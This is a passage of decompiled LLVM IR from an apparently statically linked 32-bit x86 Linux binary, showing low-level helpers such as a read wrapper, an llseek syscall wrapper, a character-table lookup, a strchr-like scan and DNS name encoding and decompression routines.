  uselistorder i32 4, { 119, 120, 121, 115, 113, 114, 116, 117, 118, 18, 1, 122, 123, 124, 125, 126, 127, 128, 129, 130, 24, 73, 74, 75, 25, 26, 27, 131, 45, 19, 77, 2, 3, 216, 217, 218, 219, 220, 221, 4, 160, 76, 255, 97, 132, 133, 134, 135, 136, 137, 53, 138, 139, 140, 141, 56, 28, 142, 143, 144, 145, 29, 30, 31, 57, 32, 33, 34, 35, 146, 36, 147, 58, 37, 59, 60, 5, 161, 162, 163, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 49, 232, 256, 233, 257, 258, 264, 265, 0, 269, 270, 271, 259, 46, 70, 98, 99, 260, 261, 262, 263, 6, 78, 79, 80, 81, 82, 61, 100, 101, 102, 54, 170, 171, 172, 173, 83, 84, 85, 86, 87, 55, 7, 88, 89, 266, 267, 176, 177, 178, 179, 180, 181, 8, 182, 183, 184, 185, 186, 187, 188, 189, 174, 175, 190, 48, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 16, 211, 212, 214, 213, 9, 62, 148, 149, 47, 150, 151, 152, 153, 20, 10, 21, 268, 11, 154, 91, 234, 12, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 38, 39, 71, 22, 252, 253, 254, 164, 13, 165, 50, 166, 92, 93, 94, 51, 52, 23, 95, 96, 167, 168, 63, 64, 65, 40, 90, 41, 42, 66, 103, 43, 44, 104, 105, 106, 107, 108, 67, 109, 110, 111, 112, 155, 68, 156, 157, 158, 69, 159, 169, 17, 14, 215, 15, 72 }
  uselistorder i32* @ebp, { 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 9, 10, 11, 1, 12, 13, 14, 4, 46, 47, 48, 53, 49, 50, 51, 52, 54, 151, 152, 55, 56, 57, 58, 59, 60, 61, 153, 154, 155, 156, 157, 8, 23, 24, 15, 16, 17, 25, 26, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 149, 145, 146, 147, 148, 3, 150, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 5, 158, 159, 160, 161, 162, 90, 2, 91, 92, 93, 94, 95, 96, 97, 98, 99, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 0, 174, 18, 19, 20, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 113, 112, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 175, 176, 177, 128, 129, 130, 21, 22, 27, 28, 29, 30, 73, 74, 75, 76, 77, 78, 79, 80, 81, 6, 82, 83, 84, 85, 7, 86, 87, 88, 89, 131, 178, 179 }
  uselistorder i32 %arg9, { 3, 0, 1, 2 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8051b8d, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8051b6d, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8051b53.outer.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8051b09, { 1, 0 }
  uselistorder label %dec_label_pc_8051aed, { 1, 0 }
  uselistorder label %dec_label_pc_8051ab0, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8051a77.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8051a9d, { 1, 0 }
  uselistorder label %dec_label_pc_8051a6b, { 1, 0 }
  uselistorder label %dec_label_pc_8051a54, { 1, 0 }
  uselistorder label %dec_label_pc_8051a54.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_8051a3d, { 1, 0 }
  uselistorder label %dec_label_pc_8051a02, { 1, 0 }
  uselistorder label %dec_label_pc_8051959, { 1, 0 }
  uselistorder label %dec_label_pc_80518e9, { 1, 0 }
}

define i32 @function_8051b9c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051b9c:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8051b9e = load i32, i32* @ebx, align 4
  store i32 %v0_8051b9e, i32* %stack_var_-12, align 4
  %v2_8051bb2 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8051bb2, i32* %esi.global-to-local, align 4
  %v1_8051bc9 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8051bc9, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_8051bc9, -4095
  br i1 %tmp18, label %dec_label_pc_8051be3, label %dec_label_pc_8051bd5

dec_label_pc_8051bd5:                             ; preds = %dec_label_pc_8051b9c
  %v2_8051bb6 = ashr i32 %arg3, 31
  %v1_8051bd5 = call i32 @function_804b4bc(i32 %v2_8051bb6)
  %v0_8051bda = load i32, i32* %esi.global-to-local, align 4
  %v1_8051bda = sub i32 0, %v0_8051bda
  %v2_8051bdc = inttoptr i32 %v1_8051bd5 to i32*
  store i32 %v1_8051bda, i32* %v2_8051bdc, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8051bf7.pre.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8051be7

dec_label_pc_8051be3:                             ; preds = %dec_label_pc_8051b9c
  %v1_8051be3 = icmp eq i32 %v1_8051bc9, 0
  br i1 %v1_8051be3, label %dec_label_pc_8051bec, label %dec_label_pc_8051be7

dec_label_pc_8051be7:                             ; preds = %dec_label_pc_8051be3, %dec_label_pc_8051bd5
  %v2_8051bf7.pre = phi i32 [ %v0_8051b9e, %dec_label_pc_8051be3 ], [ %v2_8051bf7.pre.pre, %dec_label_pc_8051bd5 ]
  %v0_8051be7 = phi i32 [ %v1_8051bc9, %dec_label_pc_8051be3 ], [ -1, %dec_label_pc_8051bd5 ]
  %v1_8051be9 = ashr i32 %v0_8051be7, 31
  br label %dec_label_pc_8051bf4

dec_label_pc_8051bec:                             ; preds = %dec_label_pc_8051be3
  %v3_8051bec = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8051bf4

dec_label_pc_8051bf4:                             ; preds = %dec_label_pc_8051be7, %dec_label_pc_8051bec
  %v2_8051bf7 = phi i32 [ %v2_8051bf7.pre, %dec_label_pc_8051be7 ], [ %v0_8051b9e, %dec_label_pc_8051bec ]
  %v0_8051bfa = phi i32 [ %v0_8051be7, %dec_label_pc_8051be7 ], [ %v3_8051bec, %dec_label_pc_8051bec ]
  %storemerge = phi i32 [ %v1_8051be9, %dec_label_pc_8051be7 ], [ %tmp, %dec_label_pc_8051bec ]
  store i32 %storemerge, i32* @edx, align 4
  store i32 %v2_8051bf7, i32* @ebx, align 4
  ret i32 %v0_8051bfa

; uselistorder directives
  uselistorder i32 %v1_8051bc9, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8051b9e, { 1, 0, 2 }
  uselistorder i32 31, { 23, 24, 12, 25, 26, 18, 19, 27, 28, 10, 2, 3, 0, 1, 8, 17, 13, 14, 15, 6, 7, 4, 5, 11, 29, 30, 16, 9, 20, 21, 22 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_8051bf4, { 1, 0 }
}

define i32 @function_8051bfc(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051bfc:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051bfc = load i32, i32* @edi, align 4
  store i32 %v0_8051bfc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8051c0c = load i32, i32* @ebx, align 4
  %v4_8051c14 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8051c0c, i32* @ebx, align 4
  store i32 %v4_8051c14, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_8051c14, -4095
  br i1 %tmp11, label %dec_label_pc_8051c2c, label %dec_label_pc_8051c20

dec_label_pc_8051c20:                             ; preds = %dec_label_pc_8051bfc
  %v1_8051c20 = call i32 @function_804b4bc(i32 %v0_8051c0c)
  %v0_8051c25 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051c25 = sub i32 0, %v0_8051c25
  %v2_8051c27 = inttoptr i32 %v1_8051c20 to i32*
  store i32 %v1_8051c25, i32* %v2_8051c27, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051c2c

dec_label_pc_8051c2c:                             ; preds = %dec_label_pc_8051bfc, %dec_label_pc_8051c20
  %v0_8051c2c = phi i32 [ %v4_8051c14, %dec_label_pc_8051bfc ], [ -1, %dec_label_pc_8051c20 ]
  %v2_8051c30 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051c30, i32* @edi, align 4
  ret i32 %v0_8051c2c

; uselistorder directives
  uselistorder i32 %v4_8051c14, { 1, 0, 2 }
  uselistorder i32 %v0_8051c0c, { 1, 0 }
  uselistorder i32 (i32)* @function_804b4bc, { 36, 24, 44, 67, 66, 39, 43, 35, 23, 22, 42, 31, 30, 41, 21, 20, 56, 14, 13, 55, 12, 50, 29, 11, 64, 10, 9, 8, 7, 54, 65, 6, 5, 2, 38, 3, 28, 49, 48, 47, 46, 63, 62, 61, 27, 26, 40, 19, 18, 4, 0, 34, 33, 53, 52, 51, 15, 45, 37, 17, 1, 16, 25, 32, 60, 59, 58, 57 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 31, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder label %dec_label_pc_8051c2c, { 1, 0 }
}

define i32 @function_8051c34(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051c34:
  store i32 %arg1, i32* @edx, align 4
  %v1_8051c38 = add i32 %arg1, 128
  %v6_8051c43 = icmp ugt i32 %v1_8051c38, 383
  br i1 %v6_8051c43, label %dec_label_pc_8051c4e, label %dec_label_pc_8051c45

dec_label_pc_8051c45:                             ; preds = %dec_label_pc_8051c34
  %v0_8051c45 = load i32, i32* bitcast (i32** @global_var_80559e8.133 to i32*), align 8
  %v2_8051c4a = mul i32 %arg1, 2
  %v3_8051c4a = add i32 %v0_8051c45, %v2_8051c4a
  %v4_8051c4a = inttoptr i32 %v3_8051c4a to i16*
  %v5_8051c4a = load i16, i16* %v4_8051c4a, align 2
  %v6_8051c4a = sext i16 %v5_8051c4a to i32
  store i32 %v6_8051c4a, i32* @edx, align 4
  br label %dec_label_pc_8051c4e

dec_label_pc_8051c4e:                             ; preds = %dec_label_pc_8051c34, %dec_label_pc_8051c45
  %v0_8051c4e = phi i32 [ %arg1, %dec_label_pc_8051c34 ], [ %v6_8051c4a, %dec_label_pc_8051c45 ]
  ret i32 %v0_8051c4e

; uselistorder directives
  uselistorder i32 65536, { 0, 2, 3, 1, 4, 65, 5, 6, 7, 8, 9, 11, 10, 13, 12, 15, 14, 17, 16, 18, 19, 20, 66, 68, 21, 23, 22, 31, 24, 32, 25, 33, 26, 34, 27, 35, 28, 36, 29, 37, 30, 43, 38, 44, 39, 45, 40, 46, 41, 47, 42, 49, 48, 50, 51, 53, 52, 55, 54, 57, 56, 58, 59, 61, 64, 60, 62, 63, 67 }
  uselistorder i32 128, { 15, 11, 13, 2, 3, 6, 12, 7, 8, 14, 4, 9, 10, 16, 0, 17, 18, 5, 1, 19 }
  uselistorder label %dec_label_pc_8051c4e, { 1, 0 }
}

define i32 @function_8051c54(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051c54:
  %v4_8051c55 = ptrtoint i8* %arg1 to i32
  %v2_8051c5d = mul i32 %arg2, 256
  %v3_8051c5d = and i32 %v2_8051c5d, 65280
  %v4_8051c5d = and i32 %arg2, -65281
  %v5_8051c5d = or i32 %v3_8051c5d, %v4_8051c5d
  %v8_8051c5f.pre = load i1, i1* @df, align 1
  %v9_8051c5f = select i1 %v8_8051c5f.pre, i32 -1, i32 1
  br label %dec_label_pc_8051c5f

dec_label_pc_8051c5f:                             ; preds = %dec_label_pc_8051c64, %dec_label_pc_8051c54
  %v4_8051c5f = phi i32 [ %v6_8051c5f, %dec_label_pc_8051c64 ], [ %v5_8051c5d, %dec_label_pc_8051c54 ]
  %v7_8051c5f = phi i32 [ %v10_8051c5f, %dec_label_pc_8051c64 ], [ %v4_8051c55, %dec_label_pc_8051c54 ]
  %v1_8051c5f = inttoptr i32 %v7_8051c5f to i8*
  %v2_8051c5f = load i8, i8* %v1_8051c5f, align 1
  %v10_8051c5f = add i32 %v7_8051c5f, %v9_8051c5f
  %v3_8051c60 = udiv i32 %v4_8051c5f, 256
  %v4_8051c60 = trunc i32 %v3_8051c60 to i8
  %v16_8051c60 = icmp eq i8 %v2_8051c5f, %v4_8051c60
  br i1 %v16_8051c60, label %dec_label_pc_8051c6d.loopexit, label %dec_label_pc_8051c64

dec_label_pc_8051c64:                             ; preds = %dec_label_pc_8051c5f
  %v3_8051c5f = zext i8 %v2_8051c5f to i32
  %v5_8051c5f = and i32 %v4_8051c5f, -256
  %v6_8051c5f = or i32 %v3_8051c5f, %v5_8051c5f
  %v4_8051c64 = icmp eq i8 %v2_8051c5f, 0
  %v1_8051c66 = icmp eq i1 %v4_8051c64, false
  br i1 %v1_8051c66, label %dec_label_pc_8051c5f, label %dec_label_pc_8051c68

dec_label_pc_8051c68:                             ; preds = %dec_label_pc_8051c64
  br label %dec_label_pc_8051c6d

dec_label_pc_8051c6d.loopexit:                    ; preds = %dec_label_pc_8051c5f
  %phitmp = add i32 %v10_8051c5f, -1
  br label %dec_label_pc_8051c6d

dec_label_pc_8051c6d:                             ; preds = %dec_label_pc_8051c6d.loopexit, %dec_label_pc_8051c68
  %v0_8051c6d = phi i32 [ 0, %dec_label_pc_8051c68 ], [ %phitmp, %dec_label_pc_8051c6d.loopexit ]
  ret i32 %v0_8051c6d

; uselistorder directives
  uselistorder i8 %v2_8051c5f, { 1, 2, 0 }
  uselistorder i32 %v4_8051c5f, { 1, 0 }
  uselistorder i32 -256, { 27, 1, 28, 0, 29, 12, 13, 30, 31, 3, 15, 14, 2, 32, 33, 6, 34, 4, 35, 5, 36, 37, 8, 17, 16, 7, 49, 50, 43, 51, 52, 53, 54, 55, 56, 68, 57, 19, 20, 21, 18, 69, 47, 48, 22, 9, 23, 70, 38, 44, 58, 59, 60, 61, 62, 10, 63, 64, 11, 65, 66, 67, 45, 24, 25, 26, 39, 40, 41, 42, 46 }
  uselistorder i1* @df, { 1, 4, 5, 11, 12, 0, 2, 13, 14, 15, 16, 3, 25, 26, 6, 7, 8, 9, 10, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_8051c74(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8051c74:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8051c75 = load i32, i32* @edi, align 4
  %v0_8051c76 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_8051c7d = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051c7d, i32* @edi, align 4
  %v1_8051cdc5 = icmp eq i8* %arg1, null
  br i1 %v1_8051cdc5, label %dec_label_pc_8051ce5, label %dec_label_pc_8051ce0.lr.ph

dec_label_pc_8051ce0.lr.ph:                       ; preds = %dec_label_pc_8051c74
  br label %dec_label_pc_8051ce0

dec_label_pc_8051c83:                             ; preds = %dec_label_pc_8051ce0
  %v0_8051c83 = load i32, i32* @edx, align 4
  %v9_8051c88 = call i32 @function_8051c54(i8* %v1_8051ce0, i32 46, i32 %v0_8051c83, i32 %v0_8051c83)
  %v1_8051c92 = icmp eq i32 %v9_8051c88, 0
  br i1 %v1_8051c92, label %dec_label_pc_8051c9c, label %dec_label_pc_8051c96

dec_label_pc_8051c96:                             ; preds = %dec_label_pc_8051c83
  %v1_8051c98 = load i32, i32* @edi, align 4
  %v2_8051c98 = sub i32 %v9_8051c88, %v1_8051c98
  br label %dec_label_pc_8051caa

dec_label_pc_8051c9c:                             ; preds = %dec_label_pc_8051c83
  %v0_8051c9f = load i32, i32* @edi, align 4
  %v5_8051c9f = inttoptr i32 %v0_8051c9f to i8*
  %v3_8051ca0 = call i32 @function_804ce94(i8* %v5_8051c9f)
  br label %dec_label_pc_8051caa

dec_label_pc_8051caa:                             ; preds = %dec_label_pc_8051c96, %dec_label_pc_8051c9c
  %v0_8051cbd = phi i32 [ %v2_8051c98, %dec_label_pc_8051c96 ], [ %v3_8051ca0, %dec_label_pc_8051c9c ]
  store i32 %v0_8051cbd, i32* @esi, align 4
  %v1_8051caa = icmp eq i32 %v0_8051cbd, 0
  %v3_8051caa = trunc i32 %v0_8051cbd to i8
  br i1 %v1_8051caa, label %dec_label_pc_8051cf9, label %dec_label_pc_8051cae

dec_label_pc_8051cae:                             ; preds = %dec_label_pc_8051caa
  %v1_8051cb2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051cb2 = sub i32 %arg3, %v1_8051cb2
  %v1_8051cb4 = add i32 %v2_8051cb2, -1
  %v7_8051cb5 = icmp ult i32 %v0_8051cbd, %v1_8051cb4
  %v1_8051cb7 = icmp eq i1 %v7_8051cb5, false
  br i1 %v1_8051cb7, label %dec_label_pc_8051cf9, label %dec_label_pc_8051cb9

dec_label_pc_8051cb9:                             ; preds = %dec_label_pc_8051cae
  store i32 %arg2, i32* @edx, align 4
  %v4_8051cbf = add i32 %v1_8051cb2, %arg2
  %v5_8051cbf = inttoptr i32 %v4_8051cbf to i8*
  store i8 %v3_8051caa, i8* %v5_8051cbf, align 1
  %v0_8051cc2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051cc2 = add i32 %v0_8051cc2, 1
  %v0_8051cc4 = load i32, i32* @edx, align 4
  %v2_8051cc6 = add i32 %v1_8051cc2, %v0_8051cc4
  %v0_8051cc8 = load i32, i32* @esi, align 4
  %v0_8051cc9 = load i32, i32* @edi, align 4
  %v2_8051ccb = add i32 %v0_8051cc8, %v1_8051cc2
  store i32 %v2_8051ccb, i32* %ebx.global-to-local, align 4
  %tmp30 = inttoptr i32 %v2_8051cc6 to i16*
  %v7_8051ccd = call i32 @function_804ce38(i16* %tmp30, i32 %v0_8051cc9, i32 %v0_8051cc8)
  %v1_8051cd9 = add i32 %v9_8051c88, 1
  br i1 %v1_8051c92, label %dec_label_pc_8051ce5, label %dec_label_pc_8051cdc

dec_label_pc_8051cdc:                             ; preds = %dec_label_pc_8051cb9
  store i32 %v1_8051cd9, i32* @edi, align 4
  %v1_8051cdc = icmp eq i32 %v1_8051cd9, 0
  br i1 %v1_8051cdc, label %dec_label_pc_8051ce5, label %dec_label_pc_8051ce0

dec_label_pc_8051ce0:                             ; preds = %dec_label_pc_8051ce0.lr.ph, %dec_label_pc_8051cdc
  %v0_8051c87 = phi i32 [ %v4_8051c7d, %dec_label_pc_8051ce0.lr.ph ], [ %v1_8051cd9, %dec_label_pc_8051cdc ]
  %v1_8051ce0 = inttoptr i32 %v0_8051c87 to i8*
  %v2_8051ce0 = load i8, i8* %v1_8051ce0, align 1
  %v3_8051ce0 = icmp eq i8 %v2_8051ce0, 0
  %v1_8051ce3 = icmp eq i1 %v3_8051ce0, false
  br i1 %v1_8051ce3, label %dec_label_pc_8051c83, label %dec_label_pc_8051ce5

dec_label_pc_8051ce5:                             ; preds = %dec_label_pc_8051cdc, %dec_label_pc_8051ce0, %dec_label_pc_8051cb9, %dec_label_pc_8051c74
  %tmp31 = icmp slt i32 %arg3, 1
  br i1 %tmp31, label %dec_label_pc_8051cf9, label %dec_label_pc_8051cec

dec_label_pc_8051cec:                             ; preds = %dec_label_pc_8051ce5
  %v1_8051cf0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051cf0 = add i32 %v1_8051cf0, %arg2
  %v3_8051cf0 = inttoptr i32 %v2_8051cf0 to i8*
  store i8 0, i8* %v3_8051cf0, align 1
  %v0_8051cf4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051cf4 = add i32 %v0_8051cf4, 1
  br label %dec_label_pc_8051cfc

dec_label_pc_8051cf9:                             ; preds = %dec_label_pc_8051cae, %dec_label_pc_8051caa, %dec_label_pc_8051ce5
  br label %dec_label_pc_8051cfc

dec_label_pc_8051cfc:                             ; preds = %dec_label_pc_8051cec, %dec_label_pc_8051cf9
  %storemerge3 = phi i32 [ %v1_8051cf4, %dec_label_pc_8051cec ], [ -1, %dec_label_pc_8051cf9 ]
  store i32 %v0_8051c76, i32* @esi, align 4
  store i32 %v0_8051c75, i32* @edi, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i8* %v1_8051ce0, { 1, 0 }
  uselistorder i32 %v1_8051cd9, { 0, 2, 1 }
  uselistorder i32 %v0_8051cc8, { 1, 0 }
  uselistorder i1 %v1_8051c92, { 1, 0 }
  uselistorder i32 %v9_8051c88, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @function_804ce94, { 1, 4, 5, 3, 2, 6, 7, 8, 0 }
  uselistorder i32 46, { 1, 2, 0, 3 }
  uselistorder i8* null, { 3, 4, 2, 6, 0, 1, 5, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_8051cfc, { 1, 0 }
  uselistorder label %dec_label_pc_8051cf9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051ce5, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8051ce0, { 1, 0 }
  uselistorder label %dec_label_pc_8051caa, { 1, 0 }
}

define i32 @function_8051d04(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051d04:
  %ebp.global-to-local = alloca i32, align 4
  %v0_8051d06 = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @edx, align 4
  %v4_8051d0f = icmp eq i32 %arg1, 0
  br i1 %v4_8051d0f, label %dec_label_pc_8051dd0, label %dec_label_pc_8051d1a

dec_label_pc_8051d1a:                             ; preds = %dec_label_pc_8051d04
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_8051db82740 = add i32 %arg2, %arg1
  %v3_8051db82841 = inttoptr i32 %v2_8051db82740 to i8*
  %v4_8051db82942 = load i8, i8* %v3_8051db82841, align 1
  %v1_8051dbc3144 = icmp eq i8 %v4_8051db82942, 0
  %v1_8051dbe3245 = icmp eq i1 %v1_8051dbc3144, false
  br i1 %v1_8051dbe3245, label %dec_label_pc_8051d28.lr.ph, label %dec_label_pc_8051dc4

dec_label_pc_8051d28:                             ; preds = %dec_label_pc_8051d28.lr.ph, %dec_label_pc_8051d41
  %v0_8051d32 = phi i32 [ %v0_8051d32.pre, %dec_label_pc_8051d28.lr.ph ], [ %v4_8051d4c, %dec_label_pc_8051d41 ]
  %v8_8051d2838 = phi i1 [ %v8_8051d283350, %dec_label_pc_8051d28.lr.ph ], [ true, %dec_label_pc_8051d41 ]
  %v5_8051db837.in = phi i8 [ %v5_8051db83049.in, %dec_label_pc_8051d28.lr.ph ], [ %v4_8051db8, %dec_label_pc_8051d41 ]
  %stack_var_-17.136 = phi i8 [ %stack_var_-17.1.ph48, %dec_label_pc_8051d28.lr.ph ], [ 0, %dec_label_pc_8051d41 ]
  %v0_8051d2f35 = phi i32 [ %v0_8051d2f.ph46, %dec_label_pc_8051d28.lr.ph ], [ %v2_8051d5b, %dec_label_pc_8051d41 ]
  %v5_8051db837 = zext i8 %v5_8051db837.in to i32
  %v1_8051d2f = add i32 %v0_8051d2f35, 1
  store i32 %v1_8051d2f, i32* @esi, align 4
  %v3_8051d32 = select i1 %v8_8051d2838, i32 2, i32 1
  %v4_8051d32 = add i32 %v3_8051d32, %v0_8051d32
  store i32 %v4_8051d32, i32* %ebp.global-to-local, align 4
  %v1_8051d35 = and i32 %v5_8051db837, 192
  %v6_8051d3a = icmp eq i32 %v1_8051d35, 192
  %v1_8051d3f = icmp eq i1 %v6_8051d3a, false
  br i1 %v1_8051d3f, label %dec_label_pc_8051d64, label %dec_label_pc_8051d41

dec_label_pc_8051d41:                             ; preds = %dec_label_pc_8051d28
  %v4_8051d4c = add i32 %v3_8051d32, %v4_8051d32
  store i32 %v4_8051d4c, i32* %ebp.global-to-local, align 4
  %tmp = urem i8 %v5_8051db837.in, 64
  %v1_8051d4f = zext i8 %tmp to i32
  %v2_8051d52 = add i32 %v1_8051d2f, %arg1
  %v3_8051d52 = inttoptr i32 %v2_8051d52 to i8*
  %v4_8051d52 = load i8, i8* %v3_8051d52, align 1
  %v5_8051d52 = zext i8 %v4_8051d52 to i32
  %v2_8051d56 = mul nuw nsw i32 %v1_8051d4f, 256
  %v2_8051d5b = or i32 %v5_8051d52, %v2_8051d56
  store i32 %v2_8051d5b, i32* @edx, align 4
  store i32 %v1_8051d81.ph47, i32* @ecx, align 4
  %v2_8051db8 = add i32 %v2_8051d5b, %arg1
  %v3_8051db8 = inttoptr i32 %v2_8051db8 to i8*
  %v4_8051db8 = load i8, i8* %v3_8051db8, align 1
  %v1_8051dbc = icmp eq i8 %v4_8051db8, 0
  %v1_8051dbe = icmp eq i1 %v1_8051dbc, false
  br i1 %v1_8051dbe, label %dec_label_pc_8051d28, label %dec_label_pc_8051dc4

dec_label_pc_8051d64:                             ; preds = %dec_label_pc_8051d28
  %v2_8051d64 = add i32 %v5_8051db837, %v1_8051d81.ph47
  %v1_8051d6d = add i32 %v2_8051d64, 1
  store i32 %v1_8051d6d, i32* @edi, align 4
  %v10_8051d6e = icmp ult i32 %v1_8051d6d, %arg4
  %v1_8051d72 = icmp eq i1 %v10_8051d6e, false
  br i1 %v1_8051d72, label %dec_label_pc_8051dd0, label %dec_label_pc_8051d74

dec_label_pc_8051d74:                             ; preds = %dec_label_pc_8051d64
  %v2_8051d7a = add i32 %v1_8051d2f, %arg1
  %v2_8051d81 = add i32 %v1_8051d81.ph47, %arg3
  %v3_8051d84 = inttoptr i32 %v2_8051d81 to i16*
  %v4_8051d84 = call i32 @function_804ce38(i16* %v3_8051d84, i32 %v2_8051d7a, i32 %v5_8051db837)
  %v0_8051d8c = load i32, i32* @esi, align 4
  %v2_8051d8c = add i32 %v0_8051d8c, %v5_8051db837
  store i32 %v2_8051d8c, i32* @edx, align 4
  br i1 %v8_8051d2838, label %dec_label_pc_8051d98, label %dec_label_pc_8051d96

dec_label_pc_8051d96:                             ; preds = %dec_label_pc_8051d74
  %v0_8051d96 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051d96 = add i32 %v0_8051d96, %v5_8051db837
  store i32 %v2_8051d96, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051d98

dec_label_pc_8051d98:                             ; preds = %dec_label_pc_8051d74, %dec_label_pc_8051d96
  %v4_8051daf = add i32 %v2_8051d64, %arg3
  %v5_8051daf = inttoptr i32 %v4_8051daf to i8*
  store i8 46, i8* %v5_8051daf, align 1
  %v0_8051db2.pre = load i32, i32* @edi, align 4
  %v1_8051db8.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_8051db2.pre, i32* @ecx, align 4
  %v2_8051db827 = add i32 %v1_8051db8.pre.pre, %arg1
  %v3_8051db828 = inttoptr i32 %v2_8051db827 to i8*
  %v4_8051db829 = load i8, i8* %v3_8051db828, align 1
  %v1_8051dbc31 = icmp eq i8 %v4_8051db829, 0
  %v1_8051dbe32 = icmp eq i1 %v1_8051dbc31, false
  %v8_8051d2833 = icmp eq i8 %stack_var_-17.136, 0
  %v0_8051d32.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_8051dbe32, label %dec_label_pc_8051d28.lr.ph, label %dec_label_pc_8051dc4

dec_label_pc_8051d28.lr.ph:                       ; preds = %dec_label_pc_8051d98, %dec_label_pc_8051d1a
  %v0_8051d32.pre = phi i32 [ 0, %dec_label_pc_8051d1a ], [ %v0_8051d32.pre.pre, %dec_label_pc_8051d98 ]
  %v8_8051d283350 = phi i1 [ false, %dec_label_pc_8051d1a ], [ %v8_8051d2833, %dec_label_pc_8051d98 ]
  %v5_8051db83049.in = phi i8 [ %v4_8051db82942, %dec_label_pc_8051d1a ], [ %v4_8051db829, %dec_label_pc_8051d98 ]
  %stack_var_-17.1.ph48 = phi i8 [ 1, %dec_label_pc_8051d1a ], [ %stack_var_-17.136, %dec_label_pc_8051d98 ]
  %v1_8051d81.ph47 = phi i32 [ 0, %dec_label_pc_8051d1a ], [ %v0_8051db2.pre, %dec_label_pc_8051d98 ]
  %v0_8051d2f.ph46 = phi i32 [ %arg2, %dec_label_pc_8051d1a ], [ %v1_8051db8.pre.pre, %dec_label_pc_8051d98 ]
  br label %dec_label_pc_8051d28

dec_label_pc_8051dc4:                             ; preds = %dec_label_pc_8051d98, %dec_label_pc_8051d41, %dec_label_pc_8051d1a
  %v0_8051dc9 = phi i32 [ 0, %dec_label_pc_8051d1a ], [ %v4_8051d4c, %dec_label_pc_8051d41 ], [ %v0_8051d32.pre.pre, %dec_label_pc_8051d98 ]
  %v8_8051d28.lcssa = phi i1 [ false, %dec_label_pc_8051d1a ], [ true, %dec_label_pc_8051d41 ], [ %v8_8051d2833, %dec_label_pc_8051d98 ]
  %v2_8051dcb = zext i1 %v8_8051d28.lcssa to i32
